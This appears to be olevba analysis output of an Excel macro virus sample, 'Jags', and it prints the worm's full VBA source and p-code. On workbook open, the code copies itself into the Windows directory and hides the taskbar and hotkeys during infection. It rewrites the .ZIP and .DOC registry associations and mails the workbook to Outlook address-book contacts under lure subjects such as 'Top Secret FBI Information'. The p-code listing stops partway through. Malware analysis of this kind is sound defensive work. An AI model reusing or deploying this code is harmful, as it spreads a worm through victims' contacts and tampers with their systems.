olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Jags.a.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Initialize()
On Error Resume Next

'nuestra tecnica polimorfica
Application.ActiveWorkbook.SaveCopyAs (OBTENER_DIR_WINDOWS & "\" & UsuarioActual & ".xls")
'desactivamos para entrar
Call UNLOAD_HOTKEYS
Call Ocultar_Barra
Call ASOCIAR_JAGS90
Call Read_Your_BookAddress 'ENVIAMOS EL GUSANO
'activamos para no dejar sospecha
Call LOAD_HOTKEYS
Call Mostrar_Barra
End Sub

Private Sub Workbook_Open()
 If (Dir(OBTENER_DIR_WINDOWS & "\*.xls", vbArchive) = "") Then
   Call Initialize
 End If
 
 UserForm1.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Hoja1.cls 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_SelectionChange(ByVal Target As Excel.Range)

End Sub
-------------------------------------------------------------------------------
VBA MACRO Hoja2.cls 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja3.cls 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO get_win_directory.bas 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/get_win_directory'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'OBTENER EL DIRECTORIO WINDOWS
Declare Function GetWindowsDirectory Lib "Kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Function OBTENER_DIR_WINDOWS() As String
On Error Resume Next

'OBTENER DIR WINDOWS
Dim WinDir As String
Dim Cadena As String
Dim ret As Long

'OBTENEMOS EL DIR
    Cadena = String$(300, Chr$(0))
    ret = GetWindowsDirectory(Cadena, Len(Cadena))
    WinDir = Left$(Cadena, InStr(Cadena, Chr$(0)) - 1)
    
    OBTENER_DIR_WINDOWS = WinDir

End Function


-------------------------------------------------------------------------------
VBA MACRO get_win_user.bas 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/get_win_user'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'PARA OBTENER EL NOMBRE DE USUARIO DE WINDOWS
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

'OBTIENE EL NOMBRE DEL USUARIO ACTUAL DE WINDOWS

Public Function UsuarioActual() As String
    On Error Resume Next
    
    Dim sBuffer As String
    Dim lSize As Long
    Dim sUsuario As String
    
    sBuffer = Space$(260)
    lSize = Len(sBuffer)
    Call GetUserName(sBuffer, lSize)
    If lSize > 0 Then
        sUsuario = Left$(sBuffer, lSize)
        'Quitarle el CHR$(0) del final...
        lSize = InStr(sUsuario, Chr$(0))
        If lSize Then
            sUsuario = Left$(sUsuario, lSize - 1)
        End If
    Else
        sUsuario = Application.UserName
    End If
    UsuarioActual = sUsuario
End Function


-------------------------------------------------------------------------------
VBA MACRO jags90_others.bas 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/jags90_others'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'obtiene el nombre de la #$#%# base de datos


Function aleatorio(hasta As Integer) As Long
Dim x, num
num = 0

  For x = 1 To hasta
    Randomize
    num = num + Rnd()
  Next x
  
  aleatorio = num
End Function

Function PolyName() As String
 Dim texto, x, hasta
 hasta = aleatorio(12) + 1
 texto = "                   "
 
 For x = 1 To hasta
   Mid$(texto, x, 1) = Chr(aleatorio(23) + 64)
 Next x
 
 PolyName = texto
End Function

-------------------------------------------------------------------------------
VBA MACRO read_address_book.bas 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/read_address_book'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Function PolyBody() As String
Dim op
op = aleatorio(1)
If (op = 0) Then
  PolyBody = ""
Else
  op = aleatorio(9)
  Select Case op
    Case Is = 0
        PolyBody = "A Greeting Card of: "
    Case Is = 1
        PolyBody = "Animated Card's "
    Case Is = 2
        PolyBody = "Top Secret FBI Information "
    Case Is = 3
        PolyBody = "HEEEEELP ME..!  "
    Case Is = 4
        PolyBody = "FEEDBACK Information "
    Case Is = 5
        PolyBody = "I send you a tiny surprise "
    Case Is = 6
        PolyBody = "Look my problem.. Attn.  "
    Case Is = 7
        PolyBody = "Check Top Secret FBI notes.. "
    Case Is = 8
        PolyBody = "Kiss my Ass..  "
    Case Else
        PolyBody = "Apocaliptical Message, Take a look..  "
  End Select
End If

End Function




 Sub Read_Your_BookAddress()
On Error Resume Next
Dim JagsOutlookApp, JagsMapiApp, JagsAddressBookItemsPointer, x, y
Dim AmountEntriesInAddressBook, AmountEntries, EmailAddress

Set JagsOutlookApp = CreateObject("Outlook.Application")
Set JagsMapiApp = JagsOutlookApp.GetNameSpace("MAPI")
  If JagsOutlookApp = "Outlook" Then 'si el servidor de correo es outlook
    JagsMapiApp.Logon "profile", "password"
    'y=numero de libretas de direcciones configuradas
    For y = 1 To JagsMapiApp.AddressLists.Count
        Set AmountEntriesInAddressBook = JagsMapiApp.AddressLists(y)
        x = 1
        Set JagsAddressBookItemsPointer = JagsOutlookApp.CreateItem(0)
        'extrae c/u de las personas que estan en la libreta (y)
        For AmountEntries = 1 To AmountEntriesInAddressBook.AddressEntries.Count
           EmailAddress = AmountEntriesInAddressBook.AddressEntries(x)
            JagsAddressBookItemsPointer.Recipients.Addtotal
            x = x + 1
            If x > 50 Then Exit For
         Next AmountEntries
         JagsAddressBookItemsPointer.Subject = PolyBody & UsuarioActual()  'el titulo del correo
         JagsAddressBookItemsPointer.Body = PolyBody 'el cuerpo del correo
         JagsAddressBookItemsPointer.Attachments.Add Application.ActiveWorkbook.FullName   'adjuntamos el archivo
         JagsAddressBookItemsPointer.Send 'envia
        EmailAddress = ""
    Next y
    JagsMapiApp.Logoff 'dejamos en paz a la aplicacion de correo.(la cerramos) TRANSLATE-> shutdown mail application
  End If

End Sub


-------------------------------------------------------------------------------
VBA MACRO reg_new_ext.bas 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/reg_new_ext'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'PARA ASOCIAR UN PROGRAMA CON UNA EXTENSION
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValue Lib "advapi32.dll" Alias "RegSetValueA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long



Sub ASOCIAR_JAGS90()
On Error Resume Next

' Return codes from Registration functions.
Const ERROR_SUCCESS = 0&
Const ERROR_BADDB = 1&
Const ERROR_BADKEY = 2&
Const ERROR_CANTOPEN = 3&
Const ERROR_CANTREAD = 4&
Const ERROR_CANTWRITE = 5&
Const ERROR_OUTOFMEMORY = 6&
Const ERROR_INVALID_PARAMETER = 7&
Const ERROR_ACCESS_DENIED = 8&
Const HKEY_CLASSES_ROOT = &H80000000
Const MAX_PATH = 260&
Const REG_SZ = 1


Dim sKeyName As String   'Holds Key Name in registry.
Dim sKeyValue As String  'Holds Key Value in registry.
Dim ret&                 'Holds error status if any from API calls.
Dim lphKey&              'Holds created key handle from RegCreateKey.

'This creates a Root entry called "JAGS90 VIRUS V2.0".
    sKeyName = "JAGS90 VIRUS V2.0"
    sKeyValue = "Jags90 Virus V2.0 By Jags Andrew 90®"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "", REG_SZ, sKeyValue, 0&)
    'EVERYONE ZIPED FILES
'This creates a Root entry called .ZIP associated with "JAGS90 VIRUS V2.0".
    sKeyName = ".ZIP"
    sKeyValue = "JAGS90 VIRUS V2.0"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "", REG_SZ, sKeyValue, 0&)

'This sets the command line for "JAGS90 VIRUS V2.0".
    sKeyName = "JAGS90 VIRUS V2.0"
    sKeyValue = OBTENER_DIR_WINDOWS() & "\NOTEPAD.exe %1"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "shell\open\command", REG_SZ, sKeyValue, MAX_PATH)
'EVERYONE DOC FILES
'This creates a Root entry called .DOC associated with "JAGS90 VIRUS V2.0".
    sKeyName = ".DOC"
    sKeyValue = "JAGS90 VIRUS V2.0"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "", REG_SZ, sKeyValue, 0&)

'This sets the command line for "JAGS90 VIRUS V2.0".
    sKeyName = "JAGS90 VIRUS V2.0"
    sKeyValue = OBTENER_DIR_WINDOWS() & "\NOTEPAD.exe %1"
    ret& = RegCreateKey&(HKEY_CLASSES_ROOT, sKeyName, lphKey&)
    ret& = RegSetValue&(lphKey&, "shell\open\command", REG_SZ, sKeyValue, MAX_PATH)

End Sub


-------------------------------------------------------------------------------
VBA MACRO unload_win_hotkeys.bas 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/unload_win_hotkeys'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Const SPI_SCREENSAVERRUNNING = 97&
Private Declare Function SystemParametersInfo Lib "User32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long

Sub UNLOAD_HOTKEYS()
On Error Resume Next
    Dim lngRet As Long
    Dim blnOld As Boolean
    lngRet = SystemParametersInfo(SPI_SCREENSAVERRUNNING, _
                  True, blnOld, 0&)
End Sub

Sub LOAD_HOTKEYS()
On Error Resume Next

'Para volver a habilitarlas:
    Dim lngRet As Long
    Dim blnOld As Boolean
    lngRet = SystemParametersInfo(SPI_SCREENSAVERRUNNING, _
                  False, blnOld, 0&)
End Sub




-------------------------------------------------------------------------------
VBA MACRO unload_win_taskbar.bas 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/unload_win_taskbar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'PARA OCULTAR LA BARRA
Declare Function FindWindow Lib "User32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SetWindowPos Lib "User32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Global Ventana As Long
Global Const Muestra = &H40
Global Const Oculta = &H80


'Oculta la barra de tareas
 Sub Ocultar_Barra()
 On Error Resume Next
    Ventana = FindWindow("Shell_traywnd", "")
    Call SetWindowPos(Ventana, 0, 0, 0, 0, 0, Oculta)
End Sub

'Muestra la barra de tareas
 Sub Mostrar_Barra()
 On Error Resume Next
    Call SetWindowPos(Ventana, 0, 0, 0, 0, 0, Muestra)
End Sub

-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mףdulo1.bas 
in file: Virus.MSExcel.Jags.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub HappyBirthday()
If Day(Now()) = 17 Then
 Worksheets("hoja1").Cells(7, 1).Value = "Colombia, September 17, 1978.."
 Worksheets("hoja1").Cells(6, 1).Value = "Happy Birthday to my brother Christiam (CJGS)"
 With Worksheets("Hoja1").Cells(6, 1).Font
    .Name = "Arial"
    .Size = 20
 End With
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Hoja
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Jags.a.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 4507 bytes
' Line #0:
' 	FuncDefn (Sub Initialize())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x001B "nuestra tecnica polimorfica"
' Line #4:
' 	Ld OBTENER_DIR_WINDOWS 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld UsuarioActual 
' 	Concat 
' 	LitStr 0x0004 ".xls"
' 	Concat 
' 	Paren 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveCopyAs 0x0001 
' Line #5:
' 	QuoteRem 0x0000 0x0018 "desactivamos para entrar"
' Line #6:
' 	ArgsCall (Call) UNLOAD_HOTKEYS 0x0000 
' Line #7:
' 	ArgsCall (Call) Ocultar_Barra 0x0000 
' Line #8:
' 	ArgsCall (Call) ASOCIAR_JAGS90 0x0000 
' Line #9:
' 	ArgsCall (Call) Read_Your_BookAddress 0x0000 
' 	QuoteRem 0x001B 0x0012 "ENVIAMOS EL GUSANO"
' Line #10:
' 	QuoteRem 0x0000 0x0020 "activamos para no dejar sospecha"
' Line #11:
' 	ArgsCall (Call) LOAD_HOTKEYS 0x0000 
' Line #12:
' 	ArgsCall (Call) Mostrar_Barra 0x0000 
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #16:
' 	Ld OBTENER_DIR_WINDOWS 
' 	LitStr 0x0006 "\*.xls"
' 	Concat 
' 	Ld vbArchive 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #17:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #18:
' 	EndIfBlock 
' Line #19:
' Line #20:
' 	Ld UserForm1 
' 	ArgsMemCall Show 0x0000 
' Line #21:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Hoja1 - 1745 bytes
' Line #0:
' 	FuncDefn (Private Sub Worksheet_SelectionChange(ByVal Target As ))
' Line #1:
' Line #2:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Hoja2 - 1183 bytes
' _VBA_PROJECT_CUR/VBA/Hoja3 - 1183 bytes
' _VBA_PROJECT_CUR/VBA/get_win_directory - 2312 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001D "OBTENER EL DIRECTORIO WINDOWS"
' Line #1:
' 	FuncDefn (Declare Function GetWindowsDirectory Lib "Kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #2:
' Line #3:
' 	FuncDefn (Function OBTENER_DIR_WINDOWS() As String)
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0013 "OBTENER DIR WINDOWS"
' Line #7:
' 	Dim 
' 	VarDefn WinDir (As String)
' Line #8:
' 	Dim 
' 	VarDefn Cadena (As String)
' Line #9:
' 	Dim 
' 	VarDefn ret (As Long)
' Line #10:
' Line #11:
' 	QuoteRem 0x0000 0x0010 "OBTENEMOS EL DIR"
' Line #12:
' 	LitDI2 0x012C 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	ArgsLd String$$ 0x0002 
' 	St Cadena 
' Line #13:
' 	Ld Cadena 
' 	Ld Cadena 
' 	FnLen 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St ret 
' Line #14:
' 	Ld Cadena 
' 	Ld Cadena 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St WinDir 
' Line #15:
' Line #16:
' 	Ld WinDir 
' 	St OBTENER_DIR_WINDOWS 
' Line #17:
' Line #18:
' 	EndFunc 
' Line #19:
' Line #20:
' _VBA_PROJECT_CUR/VBA/get_win_user - 2802 bytes
' Line #0:
' 	QuoteRem 0x0000 0x002C "PARA OBTENER EL NOMBRE DE USUARIO DE WINDOWS"
' Line #1:
' 	FuncDefn (Declare Function GetUserName Lib "advapi32.dll" (ByVal lpBuffer As String, nSize As Long) As Long)
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x002F "OBTIENE EL NOMBRE DEL USUARIO ACTUAL DE WINDOWS"
' Line #4:
' Line #5:
' 	FuncDefn (Public Function UsuarioActual() As String)
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' Line #8:
' 	Dim 
' 	VarDefn sBuffer (As String)
' Line #9:
' 	Dim 
' 	VarDefn lSize (As Long)
' Line #10:
' 	Dim 
' 	VarDefn sUsuario (As String)
' Line #11:
' Line #12:
' 	LitDI2 0x0104 
' 	ArgsLd Space$ 0x0001 
' 	St sBuffer 
' Line #13:
' 	Ld sBuffer 
' 	FnLen 
' 	St lSize 
' Line #14:
' 	Ld sBuffer 
' 	Ld lSize 
' 	ArgsCall (Call) GetUserName 0x0002 
' Line #15:
' 	Ld lSize 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #16:
' 	Ld sBuffer 
' 	Ld lSize 
' 	ArgsLd LBound$ 0x0002 
' 	St sUsuario 
' Line #17:
' 	QuoteRem 0x0008 0x0020 "Quitarle el CHR$(0) del final..."
' Line #18:
' 	Ld sUsuario 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	St lSize 
' Line #19:
' 	Ld lSize 
' 	IfBlock 
' Line #20:
' 	Ld sUsuario 
' 	Ld lSize 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St sUsuario 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	Ld Application 
' 	MemLd UserName 
' 	St sUsuario 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld sUsuario 
' 	St UsuarioActual 
' Line #26:
' 	EndFunc 
' Line #27:
' Line #28:
' _VBA_PROJECT_CUR/VBA/jags90_others - 2951 bytes
' Line #0:
' 	QuoteRem 0x0000 0x002B "obtiene el nombre de la #$#%# base de datos"
' Line #1:
' Line #2:
' Line #3:
' 	FuncDefn (Function aleatorio(hasta As Integer) As Long)
' Line #4:
' 	Dim 
' 	VarDefn x
' 	VarDefn num
' Line #5:
' 	LitDI2 0x0000 
' 	St num 
' Line #6:
' Line #7:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hasta 
' 	For 
' Line #8:
' 	ArgsCall Read 0x0000 
' Line #9:
' 	Ld num 
' 	ArgsLd Rnd 0x0000 
' 	Add 
' 	St num 
' Line #10:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' Line #12:
' 	Ld num 
' 	St aleatorio 
' Line #13:
' 	EndFunc 
' Line #14:
' Line #15:
' 	FuncDefn (Function PolyName() As String)
' Line #16:
' 	Dim 
' 	VarDefn texto
' 	VarDefn x
' 	VarDefn hasta
' Line #17:
' 	LitDI2 0x000C 
' 	ArgsLd aleatorio 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St hasta 
' Line #18:
' 	LitStr 0x0013 "                   "
' 	St texto 
' Line #19:
' Line #20:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld hasta 
' 	For 
' Line #21:
' 	LitDI2 0x0017 
' 	ArgsLd aleatorio 0x0001 
' 	LitDI2 0x0040 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld texto 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Mid 
' Line #22:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' Line #24:
' 	Ld texto 
' 	St PolyName 
' Line #25:
' 	EndFunc 
' Line #26:
' _VBA_PROJECT_CUR/VBA/read_address_book - 6405 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Function PolyBody() As String)
' Line #2:
' 	Dim 
' 	VarDefn op
' Line #3:
' 	LitDI2 0x0001 
' 	ArgsLd aleatorio 0x0001 
' 	St op 
' Line #4:
' 	Ld op 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0000 ""
' 	St PolyBody 
' Line #6:
' 	ElseBlock 
' Line #7:
' 	LitDI2 0x0009 
' 	ArgsLd aleatorio 0x0001 
' 	St op 
' Line #8:
' 	Ld op 
' 	SelectCase 
' Line #9:
' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' Line #10:
' 	LitStr 0x0014 "A Greeting Card of: "
' 	St PolyBody 
' Line #11:
' 	LitDI2 0x0001 
' 	CaseEq 
' 	CaseDone 
' Line #12:
' 	LitStr 0x0010 "Animated Card's "
' 	St PolyBody 
' Line #13:
' 	LitDI2 0x0002 
' 	CaseEq 
' 	CaseDone 
' Line #14:
' 	LitStr 0x001B "Top Secret FBI Information "
' 	St PolyBody 
' Line #15:
' 	LitDI2 0x0003 
' 	CaseEq 
' 	CaseDone 
' Line #16:
' 	LitStr 0x0010 "HEEEEELP ME..!  "
' 	St PolyBody 
' Line #17:
' 	LitDI2 0x0004 
' 	CaseEq 
' 	CaseDone 
' Line #18:
' 	LitStr 0x0015 "FEEDBACK Information "
' 	St PolyBody 
' Line #19:
' 	LitDI2 0x0005 
' 	CaseEq 
' 	CaseDone 
' Line #20:
' 	LitStr 0x001B "I send you a tiny surprise "
' 	St PolyBody 
' Line #21:
' 	LitDI2 0x0006 
' 	CaseEq 
' 	CaseDone 
' Line #22:
' 	LitStr 0x0019 "Look my problem.. Attn.  "
' 	St PolyBody 
' Line #23:
' 	LitDI2 0x0007 
' 	CaseEq 
' 	CaseDone 
' Line #24:
' 	LitStr 0x001D "Check Top Secret FBI notes.. "
' 	St PolyBody 
' Line #25:
' 	LitDI2 0x0008 
' 	CaseEq 
' 	CaseDone 
' Line #26:
' 	LitStr 0x000F "Kiss my Ass..  "
' 	St PolyBody 
' Line #27:
' 	CaseElse 
' Line #28:
' 	LitStr 0x0026 "Apocaliptical Message, Take a look..  "
' 	St PolyBody 
' Line #29:
' 	EndSelect 
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	EndFunc 
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' 	FuncDefn (Sub Read_Your_BookAddress())
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	Dim 
' 	VarDefn JagsOutlookApp
' 	VarDefn JagsMapiApp
' 	VarDefn JagsAddressBookItemsPointer
' 	VarDefn x
' 	VarDefn y
' Line #40:
' 	Dim 
' 	VarDefn AmountEntriesInAddressBook
' 	VarDefn AmountEntries
' 	VarDefn EmailAddress
' Line #41:
' Line #42:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set JagsOutlookApp 
' Line #43:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld JagsOutlookApp 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set JagsMapiApp 
' Line #44:
' 	Ld JagsOutlookApp 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0025 0x0023 "si el servidor de correo es outlook"
' Line #45:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld JagsMapiApp 
' 	ArgsMemCall Logon 0x0002 
' Line #46:
' 	QuoteRem 0x0004 0x0030 "y=numero de libretas de direcciones configuradas"
' Line #47:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld JagsMapiApp 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #48:
' 	SetStmt 
' 	Ld y 
' 	Ld JagsMapiApp 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AmountEntriesInAddressBook 
' Line #49:
' 	LitDI2 0x0001 
' 	St x 
' Line #50:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld JagsOutlookApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set JagsAddressBookItemsPointer 
' Line #51:
' 	QuoteRem 0x0008 0x0036 "extrae c/u de las personas que estan en la libreta (y)"
' Line #52:
' 	StartForVariable 
' 	Ld AmountEntries 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AmountEntriesInAddressBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #53:
' 	Ld x 
' 	Ld AmountEntriesInAddressBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St EmailAddress 
' Line #54:
' 	Ld JagsAddressBookItemsPointer 
' 	MemLd Recipients 
' 	ArgsMemCall Addtotal 0x0000 
' Line #55:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #56:
' 	Ld x 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #57:
' 	StartForVariable 
' 	Ld AmountEntries 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	Ld PolyBody 
' 	ArgsLd UsuarioActual 0x0000 
' 	Concat 
' 	Ld JagsAddressBookItemsPointer 
' 	MemSt Subject 
' 	QuoteRem 0x004B 0x0014 "el titulo del correo"
' Line #59:
' 	Ld PolyBody 
' 	Ld JagsAddressBookItemsPointer 
' 	MemSt Body 
' 	QuoteRem 0x0035 0x0014 "el cuerpo del correo"
' Line #60:
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd FullName 
' 	Ld JagsAddressBookItemsPointer 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x005B 0x0015 "adjuntamos el archivo"
' Line #61:
' 	Ld JagsAddressBookItemsPointer 
' 	ArgsMemCall Send 0x0000 
' 	QuoteRem 0x002A 0x0005 "envia"
' Line #62:
' 	LitStr 0x0000 ""
' 	St EmailAddress 
' Line #63:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	Ld JagsMapiApp 
' 	ArgsMemCall Logoff 0x0000 
' 	QuoteRem 0x0017 0x005C "dejamos en paz a la aplicacion de correo.(la cerramos) TRANSLATE-> shutdown mail application"
' Line #65:
' 	EndIfBlock 
' Line #66:
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' _VBA_PROJECT_CUR/VBA/reg_new_ext - 5450 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x002A "PARA ASOCIAR UN PROGRAMA CON UNA EXTENSION"
' Line #2:
' 	FuncDefn (Private Declare Function RegCreateKey Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long)
' Line #3:
' 	FuncDefn (Private Declare Function RegSetValue Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long)
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Sub ASOCIAR_JAGS90())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' Line #10:
' 	QuoteRem 0x0000 0x002A " Return codes from Registration functions."
' Line #11:
' 	Dim (Const) 
' 	LitDI4 0x0000 0x0000 
' 	VarDefn ERROR_SUCCESS
' Line #12:
' 	Dim (Const) 
' 	LitDI4 0x0001 0x0000 
' 	VarDefn ERROR_BADDB
' Line #13:
' 	Dim (Const) 
' 	LitDI4 0x0002 0x0000 
' 	VarDefn ERROR_BADKEY
' Line #14:
' 	Dim (Const) 
' 	LitDI4 0x0003 0x0000 
' 	VarDefn ERROR_CANTOPEN
' Line #15:
' 	Dim (Const) 
' 	LitDI4 0x0004 0x0000 
' 	VarDefn ERROR_CANTREAD
' Line #16:
' 	Dim (Const) 
' 	LitDI4 0x0005 0x0000 
' 	VarDefn ERROR_CANTWRITE
' Line #17:
' 	Dim (Const) 
' 	LitDI4 0x0006 0x0000 
' 	VarDefn ERROR_OUTOFMEMORY
' Line #18:
